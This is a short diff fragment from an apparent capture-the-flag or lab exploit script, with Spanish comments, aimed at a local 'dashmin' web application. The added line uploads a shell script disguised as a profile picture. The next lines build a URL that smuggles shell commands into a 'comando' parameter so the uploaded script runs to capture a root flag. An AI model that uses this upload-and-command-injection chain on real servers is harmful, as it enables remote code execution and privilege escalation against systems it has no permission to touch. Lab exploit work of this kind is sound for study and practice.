@@ -36,7 +36,7 @@ curl -X POST \
 
 # Mostrar la respuesta del login
 #echo "Login completado, cookies guardadas."
-
+curl -X POST -F "profile_picture=@gdb.sh" http://localhost/web/www/html/final/dashmin/upload.php
 # 1. URL para obtener los archivos y ejecutar el comando para obtener la flag_root
 files_url_root="http://localhost/web/www/html/final/dashmin/list_uploads.php?comando=ls%20uploads%3B%20cd%20uploads;./gdb.sh"
 
